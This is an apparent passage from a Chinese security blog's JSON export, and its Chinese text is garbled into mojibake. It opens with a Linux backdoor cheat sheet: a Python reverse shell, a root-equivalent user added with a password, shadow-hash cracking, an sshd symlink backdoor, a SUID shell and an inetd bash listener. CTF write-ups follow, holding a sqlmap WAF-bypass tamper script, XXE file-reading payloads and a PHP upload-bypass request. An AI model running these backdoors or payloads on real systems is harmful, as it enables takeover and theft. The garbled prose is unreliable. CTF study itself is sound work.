socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#39;;\\r\\rno crontab forwhoami%100c\\n&quot;)|crontab - Linux/Unix æ·»åŠ  UID ä¸º 0 çš„ç”¨æˆ·å…äº¤äº’è®¾ç½®å¯†ç  useradd seradd -u 0 -o -g root -G fdrag0n echo &quot;passwd&quot; | passwd --stdin fdrag0n å› ä¸ºlinuxå¯èƒ½æœ‰å¯†ç ç­–ç•¥æ‰€ä»¥æ¨èä½¿ç”¨å¼ºå¯†ç æ›¿æ¢passwd çˆ†ç ´linuxå¯†ç å–å‡º/etc/shadowhashcatçˆ†ç ´ sshå…¬é’¥å…å¯†å°†å®¢æˆ·ç«¯ç”Ÿæˆçš„sshå…¬é’¥å†™åˆ°æ‰€æ§æœåŠ¡å™¨çš„~/.ssh/authorized_keysä¸­ï¼Œç„¶åå®¢æˆ·ç«¯åˆ©ç”¨ç§é’¥å®Œæˆè®¤è¯å³å¯ç™»å½•ã€‚ å®¢æˆ·ç«¯ï¼š $ ssh-keygen -t rsa $ ls id_rsa id_rsa.pub æŠŠid_rsa.pubå†™å…¥æœåŠ¡ç«¯çš„authorized_keysä¸­ï¼Œå¹¶ä¿®æ”¹å¥½ç›¸åº”æƒé™ã€‚ æœåŠ¡ç«¯ï¼š $ chmod 600 ~/.ssh/authorized_keys $ chmod 700 ~/.ssh è¿™ç§åé—¨çš„ç‰¹ç‚¹æ˜¯ç®€å•æ˜“ç”¨ï¼Œä½†åœ¨å®æˆ˜ä¸­ä¼šè¢«æœåŠ¡å™¨çš„é…ç½®ç¯å¢ƒæ‰€é™åˆ¶ï¼Œä»¥åŠå®¹æ˜“è¢«å‘ç°(åªè¦è¿ç»´ä¸å‚»)ã€‚ è½¯è¿æ¥åé—¨ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333; ç»å…¸åé—¨ã€‚ç›´æ¥å¯¹sshdå»ºç«‹è½¯è¿æ¥ï¼Œä¹‹åç”¨ä»»æ„å¯†ç ç™»å½•å³å¯ã€‚ ä½†è¿™éšè”½æ€§å¾ˆå¼±ï¼Œé˜²æŠ¤è½¯ä»¶æˆ–è€…æŸ¥çœ‹ç«¯å£çŠ¶æ€éƒ½å¯ä»¥æ‰¾åˆ°ã€‚ é‡å¯ä¼šæ–­å¼€ SUID shellåœ¨rootè´¦å·ä¸‹æ‰§è¡Œ cp /bin/bash /.fdrag0n chmod 4755 /.fdrag0n åœ¨æ™®é€šç”¨æˆ·ä¸‹æ‰§è¡Œ /.fdrag0n -p æ£€æŸ¥æ‰‹æ®µ find / -perm +4000 -ls inetdåé—¨ä¿®æ”¹ /etc/inetd.conf æ–‡ä»¶ åŸæ–‡ä»¶ï¼š #chargen dgram udp wait root internal #discard stream tcp nowait root internal #discard dgram udp wait root internal #daytime stream tcp nowait root internal ä¿®æ”¹ä¸º: #discard stream tcp nowait root internal #discard dgram udp wait root internal daytime stream tcp nowait root /bin/bash bash -i ç„¶åé‡å¯inetd ps -ef | grep inetdroot kill -HUP xxx ç„¶åncè¿æ¥å³å¯ rootkitopensshåé—¨å‚è§https://fdrag0n.github.io/2018/05/15/SSHåé—¨å¤ç°/ å†…æ ¸çº§rookitæš‚æœªå¤ç°ï¼Œå¤ç°åè¡¥ä¸Š","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"HCTF2018-Kzone","slug":"HCTF2018-Kzone","date":"2018-10-19T14:19:24.000Z","updated":"2019-12-05T13:19:54.981Z","comments":true,"path":"2018/10/19/HCTF2018-Kzone/","link":"","permalink":"http://yoursite.com/2018/10/19/HCTF2018-Kzone/","excerpt":"Kzoneéšæ‰‹ä¸€æµ‹å‘ç°å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œwww.zipï¼Œä¸‹è½½åä»£ç å®¡è®¡ã€‚ çœ‹åˆ°æœ‰åå° æŸ¥çœ‹login.phpçš„æºç ï¼š/www/admin å‘ç°å¼•å…¥äº†é…ç½®æ–‡ä»¶../include/common.php 123456789101112131415161718192021222324&lt;?php error_reporting(0);header('Content-Type: text/html; charset=UTF-8');define('IN_CRONLITE', true);define('ROOT', dirname(__FILE__).'/');define('LOGIN_KEY', 'abchdbb679546');date_default_timezone_set(\"PRC\");$date = date(\"Y-m-d H:i:s\");session_start();include ROOT.'../config.php';if(!isset($port))$port='3306';include_once(ROOT.\"db.class.php\");$DB=new DB($host,$user,$pwd,$dbname,$port);$password_hash='!@#%!s!';require_once \"safe.php\";require_once ROOT.\"function.php\";require_once ROOT.\"member.php\";require_once ROOT.\"os.php\";require_once ROOT.\"kill.intercept.php\";?&gt;","text":"Kzoneéšæ‰‹ä¸€æµ‹å‘ç°å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œwww.zipï¼Œä¸‹è½½åä»£ç å®¡è®¡ã€‚ çœ‹åˆ°æœ‰åå° æŸ¥çœ‹login.phpçš„æºç ï¼š/www/admin å‘ç°å¼•å…¥äº†é…ç½®æ–‡ä»¶../include/common.php 123456789101112131415161718192021222324&lt;?php error_reporting(0);header('Content-Type: text/html; charset=UTF-8');define('IN_CRONLITE', true);define('ROOT', dirname(__FILE__).'/');define('LOGIN_KEY', 'abchdbb679546');date_default_timezone_set(\"PRC\");$date = date(\"Y-m-d H:i:s\");session_start();include ROOT.'../config.php';if(!isset($port))$port='3306';include_once(ROOT.\"db.class.php\");$DB=new DB($host,$user,$pwd,$dbname,$port);$password_hash='!@#%!s!';require_once \"safe.php\";require_once ROOT.\"function.php\";require_once ROOT.\"member.php\";require_once ROOT.\"os.php\";require_once ROOT.\"kill.intercept.php\";?&gt; å¯ä»¥çœ‹åˆ°å¼•å…¥äº†safe.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfunction waf($string)&#123; $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i'; return preg_replace_callback($blacklist, function ($match) &#123; return '@' . $match[0] . '@'; &#125;, $string);&#125;function safe($string)&#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = safe($val); &#125; &#125; else &#123; $string = waf($string); &#125; return $string;&#125;foreach ($_GET as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_GET[$key] = $value;&#125;foreach ($_POST as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_POST[$key] = $value;&#125;foreach ($_COOKIE as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_COOKIE[$key] = $value;&#125;unset($cplen, $key, $value);?&gt; å‘ç°wafè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­— ç„¶åå†çœ‹member.php 1234567891011121314151617181920212223242526272829303132&lt;?phpif (!defined('IN_CRONLITE')) exit();$islogin = 0;if (isset($_COOKIE[\"islogin\"])) &#123; if ($_COOKIE[\"login_data\"]) &#123; $login_data = json_decode($_COOKIE['login_data'], true); $admin_user = $login_data['admin_user']; $udata = $DB-&gt;get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\"); if ($udata['username'] == '') &#123; setcookie(\"islogin\", \"\", time() - 604800); setcookie(\"login_data\", \"\", time() - 604800); &#125; $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $login_data['admin_pass']) &#123; $islogin = 1; &#125; else &#123; setcookie(\"islogin\", \"\", time() - 604800); setcookie(\"login_data\", \"\", time() - 604800); &#125; &#125;&#125;if (isset($_SESSION['islogin'])) &#123; if ($_SESSION[\"admin_user\"]) &#123; $admin_user = base64_decode($_SESSION['admin_user']); $udata = $DB-&gt;get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\"); $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $_SESSION[\"admin_pass\"]) &#123; $islogin = 1; &#125; &#125;&#125;?&gt; ç¬¬6è¡Œjson_decode()ä¼šæŠŠunicodeè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡waf æŠ“ä¸ªåŒ…:ï¼Œå¹¶ä¸”åœ¨cookieæ·»åŠ islogin=1å’Œlogin_data=* 123456789101112131415POST /admin/login.php HTTP/1.1Host: 206.189.144.143:10000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://206.189.144.143:10000/admin/login.phpContent-Type: application/x-www-form-urlencodedContent-Length: 25DNT: 1Connection: closeCookie: PHPSESSID=gu1u7fsbr0pub63546vot34163; islogin=1; login_data=*Upgrade-Insecure-Requests: 1user=1&amp;pass=2&amp;login=Login ç„¶åç¼–å†™tamper 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = '''&#123;\"admin_user\":\"%s\"&#125;;''' payload = payload.lower() payload = payload.replace('u', '\\u0075') payload = payload.replace('o', '\\u006f') payload = payload.replace('i', '\\u0069') payload = payload.replace('\\'', '\\u0027') payload = payload.replace('\\\"', '\\u0022') payload = payload.replace(' ', '\\u0020') payload = payload.replace('s', '\\u0073') payload = payload.replace('#', '\\u0023') payload = payload.replace('&gt;', '\\u003e') payload = payload.replace('&lt;', '\\u003c') payload = payload.replace('-', '\\u002d') payload = payload.replace('=', '\\u003d') payload = payload.replace('f1a9', 'F1a9') payload = payload.replace('f1', 'F1') return data % payload python .\\sqlmap.py -r test.txt â€“tamper hctf -o â€“dbms mysql -D hctf_kouzone -T F1444g -C F1a9 â€“dump å¾—åˆ°flagï¼šhctf{hctf_2018_kzone_Author_Li4n0}","categories":[],"tags":[]},{"title":"SCTF2018-nginxçš„ç§˜å¯†wp","slug":"SCTF2018-nginxçš„ç§˜å¯†wp","date":"2018-09-13T14:19:24.000Z","updated":"2019-12-05T13:20:08.088Z","comments":true,"path":"2018/09/13/SCTF2018-nginxçš„ç§˜å¯†wp/","link":"","permalink":"http://yoursite.com/2018/09/13/SCTF2018-nginxçš„ç§˜å¯†wp/","excerpt":"NGINXçš„ç§˜å¯†NGINXé…ç½®é—®é¢˜å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å– /static../etc/nginx/nginx.confï¼Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113user www-data;worker_processes auto;pid /run/nginx.pid;events &#123; worker_connections 768; # multi_accept on;&#125;http &#123; ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## #access_log /var/log/nginx/access.log; #error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off; limit_conn_zone $binary_remote_addr zone=conn:10m; limit_req_zone $binary_remote_addr zone=allips:10m rate=2r/s; server &#123; listen 4455 default_server; server_name localhost; location /static &#123; alias /home/; &#125; location ~* \\.(css|js|gif|png)&#123; proxy_cache my_cache; proxy_cache_valid 200 30s; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; proxy_ignore_headers Expires Cache-Control Set-Cookie; &#125; location / &#123; limit_conn conn 10; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; &#125; &#125; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;&#125;#mail &#123;# # See sample authentication script at:# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# # # auth_http localhost/auth.php;# # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;# # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;# # server &#123;# listen localhost:110;# protocol pop3;# proxy on;# &#125;# # server &#123;# listen localhost:143;# protocol imap;# proxy on;# &#125;#&#125; å¯ä»¥çœ‹åˆ°å¼€å¯äº†ç¼“å­˜ï¼Œä¼šæŠŠcss|js|gif|pngè¿™å››ç§æ–‡ä»¶ç±»å‹ç¼“å­˜ã€‚","text":"NGINXçš„ç§˜å¯†NGINXé…ç½®é—®é¢˜å¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å– /static../etc/nginx/nginx.confï¼Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113user www-data;worker_processes auto;pid /run/nginx.pid;events &#123; worker_connections 768; # multi_accept on;&#125;http &#123; ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## #access_log /var/log/nginx/access.log; #error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off; limit_conn_zone $binary_remote_addr zone=conn:10m; limit_req_zone $binary_remote_addr zone=allips:10m rate=2r/s; server &#123; listen 4455 default_server; server_name localhost; location /static &#123; alias /home/; &#125; location ~* \\.(css|js|gif|png)&#123; proxy_cache my_cache; proxy_cache_valid 200 30s; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; proxy_ignore_headers Expires Cache-Control Set-Cookie; &#125; location / &#123; limit_conn conn 10; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; &#125; &#125; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;&#125;#mail &#123;# # See sample authentication script at:# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# # # auth_http localhost/auth.php;# # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;# # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;# # server &#123;# listen localhost:110;# protocol pop3;# proxy on;# &#125;# # server &#123;# listen localhost:143;# protocol imap;# proxy on;# &#125;#&#125; å¯ä»¥çœ‹åˆ°å¼€å¯äº†ç¼“å­˜ï¼Œä¼šæŠŠcss|js|gif|pngè¿™å››ç§æ–‡ä»¶ç±»å‹ç¼“å­˜ã€‚æŸ¥çœ‹æ–‡æ¡£http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path ç”±proxy_cache_pathå¾—çŸ¥ç¼“å­˜æ–‡ä»¶ä¿å­˜åœ¨/tmp/mycacheï¼Œç”¨äºå®šä¹‰ç¼“å­˜æ–‡ä»¶åçš„proxy_cache_keyæœªè®¾ç½®ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ $scheme$proxy_host$request_uriï¼Œå³æ–‡ä»¶åå½¢å¼ä¸ºmd5($scheme$proxy_host$request_uri),ç”±äºproxy_cache_pathè®¾ç½®äº†levels=1:2ï¼Œå› æ­¤ç¼“å­˜æ–‡ä»¶å­˜åœ¨/tmp/mycacheä¸‹çš„ä¸¤çº§ç›®å½•ä¸‹ï¼Œç¬¬ä¸€çº§ç›®å½•åå–MD5å€¼çš„æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬äºŒçº§ç›®å½•åå–MD5å€¼çš„å€’æ•°2ã€3ä¸ªå­—ç¬¦. åˆæ ¹æ®æç¤ºå¾—çŸ¥è·¯ç”±è§„åˆ™å¾ˆå¥‡æ€ªï¼šè®¿é—®/editxxxxxç­‰åŒäºè®¿é—®/editï¼ŒåŒç†è®¿é—®/write_plan/a.jsç­‰åŒäºè®¿é—®/write_plan. å› è€Œæ„é€ http://149.129.103.103:4455/write_plan/a.js/ æäº¤ç»™ç®¡ç†å‘˜è®¿é—® æœºå™¨äººæŒ‚äº†è¿˜å¾—æ‰‹åŠ¨ğŸ˜‚ å¾—åˆ°è·¯å¾„ä¸ºè¿™é‡Œæ˜¯ä¸ªå‘ ä¸æ˜¯md5(http://149.129.103.103:4455/write_plan/a.js/) è€Œæ˜¯md5(http://bugweb.app:8000/write_plan/a.js/) == 6fcfa7b1e6bad837b70dc98c9b82b43b æ‰€ä»¥åº”è¯¥è®¿é—®è·¯å¾„ä¸ºhttp://149.129.103.103:4455/static../tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b å¯ä»¥çœ‹åˆ°ftpç”¨æˆ·åä¸å¯†ç syc10ver Eec5TN9fruOOTp2G. ç„¶ååˆ©ç”¨xxeæ‰§è¡Œarpå‘½ä»¤ version12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM&quot;file:///proc/net/arp&quot;&gt;]&gt;&lt;plans&gt; &lt;plan&gt; &lt;content&gt;&amp;remote;&lt;/content&gt; &lt;/plan&gt;&lt;/plans&gt; å¾—åˆ°3ä¸ªip a few seconds ago 172.19.0.1 0x1 0x2 02:42:ec:2a:71:fb * eth0 a few seconds ago a few seconds ago 172.19.0.4 0x1 0x2 02:42:ac:13:00:04 * eth0 a few seconds ago a few seconds ago 172.19.0.2 0x1 0x2 02:42:ac:13:00:02 * eth0 ç„¶ååˆ©ç”¨ftpè¯»æ–‡ä»¶ 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM&quot;ftp://syc10ver:Eec5TN9fruOOTp2G@172.19.0.1/flag327a6c4304ad5938eaf0efb6cc3e53dc&quot;&gt;]&gt;&lt;plans&gt; &lt;plan&gt; &lt;content&gt;payload &amp;remote;&lt;/content&gt; &lt;/plan&gt;&lt;/plans&gt; sctf{Not_0n1y_xx3_but_als0_web_cache}","categories":[],"tags":[]},{"title":"PHPæ•°ç»„ä¸cæ•°ç»„å·®å¼‚è€Œå¼•å‘çš„å®‰å…¨é—®é¢˜","slug":"PHPæ•°ç»„ä¸cæ•°ç»„å·®å¼‚è€Œå¼•å‘çš„é—®é¢˜","date":"2018-08-24T14:19:24.000Z","updated":"2019-08-19T03:00:15.638Z","comments":true,"path":"2018/08/24/PHPæ•°ç»„ä¸cæ•°ç»„å·®å¼‚è€Œå¼•å‘çš„é—®é¢˜/","link":"","permalink":"http://yoursite.com/2018/08/24/PHPæ•°ç»„ä¸cæ•°ç»„å·®å¼‚è€Œå¼•å‘çš„é—®é¢˜/","excerpt":"Cè¯­è¨€æ•°ç»„Cè¯­è¨€çš„æ•°ç»„éƒ½æ˜¯ç”±è¿ç»­çš„å†…å­˜ä½ç½®ç»„æˆã€‚æœ€ä½çš„åœ°å€å¯¹åº”ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæœ€é«˜çš„åœ°å€å¯¹åº”æœ€åä¸€ä¸ªå…ƒç´ ã€‚ è®¾æœ‰ä¸€ä¸ªæ•°ç»„ 1int array[2]; æ— è®ºæ˜¯å…ˆç»™array[0]èµ‹å€¼,è¿˜æ˜¯å…ˆç»™array[1]èµ‹å€¼ï¼Œå…¶åœ¨å†…å­˜ä¸­çš„æ’åºéƒ½æ˜¯array[0]åœ¨å‰é¢array[1]åœ¨åé¢ï¼Œæ‰€ä»¥æ— è®ºæ˜¯ç”¨æŒ‡é’ˆæŒ‡å‘arrayçš„æœ€åä¸€ä¸ªå•å…ƒè¿˜æ˜¯ç›´æ¥å¼•ç”¨array[1]çš„å€¼,å…¶æ‰€æŒ‡çš„éƒ½æ˜¯åŒä¸€ä¸ªå€¼ã€‚","text":"Cè¯­è¨€æ•°ç»„Cè¯­è¨€çš„æ•°ç»„éƒ½æ˜¯ç”±è¿ç»­çš„å†…å­˜ä½ç½®ç»„æˆã€‚æœ€ä½çš„åœ°å€å¯¹åº”ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæœ€é«˜çš„åœ°å€å¯¹åº”æœ€åä¸€ä¸ªå…ƒç´ ã€‚ è®¾æœ‰ä¸€ä¸ªæ•°ç»„ 1int array[2]; æ— è®ºæ˜¯å…ˆç»™array[0]èµ‹å€¼,è¿˜æ˜¯å…ˆç»™array[1]èµ‹å€¼ï¼Œå…¶åœ¨å†…å­˜ä¸­çš„æ’åºéƒ½æ˜¯array[0]åœ¨å‰é¢array[1]åœ¨åé¢ï¼Œæ‰€ä»¥æ— è®ºæ˜¯ç”¨æŒ‡é’ˆæŒ‡å‘arrayçš„æœ€åä¸€ä¸ªå•å…ƒè¿˜æ˜¯ç›´æ¥å¼•ç”¨array[1]çš„å€¼,å…¶æ‰€æŒ‡çš„éƒ½æ˜¯åŒä¸€ä¸ªå€¼ã€‚ PHPçš„æ•°ç»„è€ŒPHPæ•°ç»„ä¸Cè¯­è¨€æ•°ç»„ä¸ä¸€æ ·ï¼ŒPHP ä¸­çš„æ•°ç»„å®é™…ä¸Šæ˜¯ä¸€ä¸ªæœ‰åºæ˜ å°„ã€‚æ˜ å°„æ˜¯ä¸€ç§æŠŠ values å…³è”åˆ° keys çš„ç±»å‹ã€‚æ­¤ç±»å‹åœ¨å¾ˆå¤šæ–¹é¢åšäº†ä¼˜åŒ–ï¼Œå› æ­¤å¯ä»¥æŠŠå®ƒå½“æˆçœŸæ­£çš„æ•°ç»„ï¼Œæˆ–åˆ—è¡¨ï¼ˆå‘é‡ï¼‰ï¼Œæ•£åˆ—è¡¨ï¼ˆæ˜¯æ˜ å°„çš„ä¸€ç§å®ç°ï¼‰ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œæ ˆï¼Œé˜Ÿåˆ—ä»¥åŠæ›´å¤šå¯èƒ½æ€§ã€‚ç”±äºæ•°ç»„å…ƒç´ çš„å€¼ä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ªæ•°ç»„ï¼Œæ ‘å½¢ç»“æ„å’Œå¤šç»´æ•°ç»„ä¹Ÿæ˜¯å…è®¸çš„ã€‚è´´ä¸Šä¸€ä¸ªç®€æ˜“çš„ä¸Šä¼ è¿‡æ»¤æºç  &lt;?php $file = $_GET[&apos;file&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } print_r ($file); echo &apos;&lt;/br&gt;&apos;; $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) { print(&apos;This file is not allowed!&lt;/br&gt;&apos;); } else print(&apos;success!&lt;/br&gt;&apos;); var_dump($file); echo &apos;&lt;/br&gt;&apos;; $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; echo &apos;filename:&apos;.$filename; echo &apos;&lt;/br&gt;&apos;; echo &apos;end($file):&apos;.end($file); ?&gt; å¦‚å›¾file[0]å’Œfile[1]éƒ½æ˜¯ç”±getä¼ å‚ï¼Œå¦‚æœå…ˆç»™file[0]èµ‹å€¼pngï¼Œå†ç»™file[1]èµ‹å€¼phpçš„è¯ï¼Œä¼šè¢«æ‹¦æˆªã€‚ file[0]=png&amp;file[1]=php ä½†æ˜¯å¦‚æœå…ˆç»™file[1]èµ‹å€¼phpï¼Œå†ç»™file[0]èµ‹å€¼pngçš„è¯ï¼Œåˆ™å¯ä»¥æˆåŠŸç»•è¿‡è¿‡æ»¤è§„åˆ™ä¸Šä¼ ã€‚ file[1]=php&amp;file[0]=png æ¼”ç¤ºæˆªå›¾ï¼š ä»£ç ç¬¬å…­è¡Œå’Œç¬¬åäºŒè¡Œå°†å…¶æ˜¾ç¤ºå‡ºæ¥ï¼Œç”±å›¾å³ä¾§å¯è§ï¼Œå¦‚æœå…ˆç»™file[0]èµ‹å€¼pngï¼Œå†ç»™file[1]èµ‹å€¼phpçš„è¯ï¼Œæ•°ç»„æ˜¯Array ( [0] =&gt; png [1] =&gt; php )ï¼Œä¼šè¢«æ‹¦æˆªã€‚ è€Œå¦‚æœå…ˆç»™file[1]èµ‹å€¼phpï¼Œå†ç»™file[0]èµ‹å€¼pngçš„è¯ï¼Œæ•°ç»„å°±æ˜¯Array ( [1] =&gt; php [0] =&gt; png ) ,å®ƒæ‰€å å†…å­˜åŒºåŸŸä¸­æœ€åä¸€ä¸ªå•å…ƒæ˜¯file[0]=&gt;pngï¼Œè€Œä¸åƒCè¯­è¨€ä¸€æ ·æ˜¯file[1]ï¼Œæ‰€ä»¥å¦‚æœè¿‡æ»¤ä»£ç ä¸€æ–¹é¢ç”¨end()æ¥å–å‡ºæ•°ç»„æœ€åä¸€ä¸ªå•å…ƒï¼Œè€Œå¦å¤–ä¸€å¤„å´ç”¨$file[count($file) - 1]æ¥å–å‡ºæœ€åä¸€ä¸ªå•å…ƒï¼Œå°±ä¼šå­˜åœ¨æœ‰ç»•è¿‡çš„æ¼æ´ã€‚ æ‹¿pythonæ¥æ¯”è¾ƒä¸€ä¸‹æ›´å¥½è¯´æ˜ Cè¯­è¨€çš„æ•°ç»„æ›´åƒPython åˆ—è¡¨(List) è€ŒPHPçš„æ•°ç»„åƒPython å­—å…¸(Dictionary) æ¶‰åŠåˆ°çš„CTFï¼š ç½‘é¼æ¯ç¬¬äºŒåœºçš„ä¸Šä¼ é¢˜â€“wafUpload&lt;?php $sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); @mkdir($sandbox); @chdir($sandbox); if (!empty($_FILES[&apos;file&apos;])) { #mime check if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) { die(&apos;This type is not allowed!&apos;); } #check filename $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) { die(&apos;This file is not allowed!&apos;); } $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) { echo &apos;Success!&apos;; echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename; } else { echo &apos;Failed!&apos;; } } show_source(__file__); ?&gt; ç¬¬8-10è¡Œmime checkéƒ¨åˆ† MIME ç±»å‹æ£€æµ‹ï¼Œä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡ã€‚ ç¬¬12-20è¡Œcheck filenameéƒ¨åˆ† å¯¹æ–‡ä»¶åç¼€è¿›è¡Œäº†æ£€æµ‹ï¼Œè€Œåç¼€ååˆ™æ˜¯å– $file æ•°ç»„ä¸­æœ€åä¸€ä¸ªå…ƒç´ ã€‚ç„¶ååœ¨ç”Ÿæˆæ–‡ä»¶çš„æ—¶å€™ï¼Œæ–‡ä»¶åå–$file æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ åšåç¼€ï¼Œè¿™æ˜æ˜¾å­˜åœ¨ç»•è¿‡ã€‚æˆ‘ä»¬åªè¦æ§åˆ¶$fileæ•°ç»„ä¸­å‚æ•°çš„å³å¯ç»•è¿‡å¹¶ getshell ï¼Œè¯·æ±‚æ•°æ®åŒ…å¦‚ä¸‹ POST / HTTP/1.1 Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/ Content-Type: multipart/form-data; boundary=---------------------------9930139772306 Content-Length: 524 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;filename[1]&quot; php -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;filename[0]&quot; png -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fdrag0n.jpg&quot; Content-Type: image/jpeg &lt;?php 